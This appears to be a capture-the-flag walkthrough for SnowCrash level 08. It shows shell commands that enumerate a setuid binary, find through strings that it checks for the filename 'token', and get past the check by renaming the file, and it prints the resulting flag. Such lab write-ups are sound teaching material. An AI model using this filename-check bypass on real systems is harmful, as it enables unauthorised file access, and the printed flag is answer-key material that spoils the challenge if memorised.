# Level 08
Enumerate as always:

    level08@SnowCrash:~$ ls -al
    total 28
    dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
    -r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
    -r-x------  1 level08 level08  675 Apr  3  2012 .profile
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token
We have a token file and a binary let's try to execute it:

    level08@SnowCrash:~$ ./level08
    ./level08 [file to read]
    level08@SnowCrash:~$ ./level08 token
    You may not access 'token'
    level08@SnowCrash:~$ strings level08
    token
    You may not access '%s'
    Unable to open %s
    Unable to read fd %d
    level08@SnowCrash:~$ echo "salut" > /tmp/lol.txt     
    level08@SnowCrash:~$ ./level08 /tmp/lol.txt
    salut
    level08@SnowCrash:~$ mv /tmp/lol.txt /tmp/token
    level08@SnowCrash:~$ ./level08 /tmp/token
    You may not access '/tmp/token'
From these strings we can deduce that it's the name of "token" that's the problem.

    level08@SnowCrash:~$ chmod 777 .
    level08@SnowCrash:~$ mv token lol
    level08@SnowCrash:~$ ./level08 lol
    quif5eloekouj29ke0vouxean
